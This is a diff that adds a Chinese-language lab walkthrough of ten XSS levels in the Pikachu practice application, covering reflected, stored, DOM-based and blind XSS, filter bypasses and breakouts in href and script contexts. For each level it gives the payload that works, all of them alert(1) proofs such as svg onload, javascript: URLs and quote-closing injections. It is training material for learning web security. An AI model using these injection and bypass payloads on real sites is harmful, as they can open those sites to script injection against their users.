@@ -1,0 +1,47 @@
+### 实操-Pikachu-XSS漏洞-全类型
+
+第一关（反射型XSS-get）
+
+1.除了前端输入长度有限制，其他没有任何条件要求，可以直接用<svg onload=alert(1)>事件触发
+2.可以直接在前端修改长度限制，然后用其他事件触发漏洞。（<script>alert(1)</script>）
+
+第二关 （反射型XSS-post）
+
+1.登录账户后直接输入<script>alert(1)</script>就可以触发
+
+第三关 （存储型XSS）
+
+1.直接输入<script>alert(1)</script>就可以触发
+
+第四关 （DOM型XSS）
+
+1.这里看F12看到输入框位置是输入到<a href='参数'>里面的
+javascript:alert(1)   #伪协议可以直接触发
+' onclick='alert(1)  #'闭合href''，'alert闭合前面的',成为完整的属性，也可以触发点击事件
+
+第五关  （DOM型XSS-X）
+
+这里和第四关一样也是<a href=''，直接输入javascript:alert(1)就可以触发
+
+第六关（盲打）
+
+1.这里提交了<script>alert(1)</script>登录后可以触发事件
+2.又提交了<img src='x' width='0' height='0' onerror=alert(1)> 也可以触发
+
+第七关（XSS之过滤）
+
+这里测试了一下它过滤了<script，其他script,alert(1),<,>这些都可以
+就用其他事件触发：<svg onload=alert(1)>
+
+第八关（XSS之htmlspecialchars）
+
+这里还是可以直接用javascript:alert(1)触发，和' onclick=' alert(1)触发
+
+第九关（XSS之href输出）
+
+javascript:alert(1) 
+
+第十关（XSS之JS输出）
+
+在script标签里面msg=''     用';alert(1);//可以触发，'闭合前面的'，;结束原语句，//注释后面的符号
+'</script><svg onload=alert(1)>  也可以触发，闭合掉前面<script>标签。
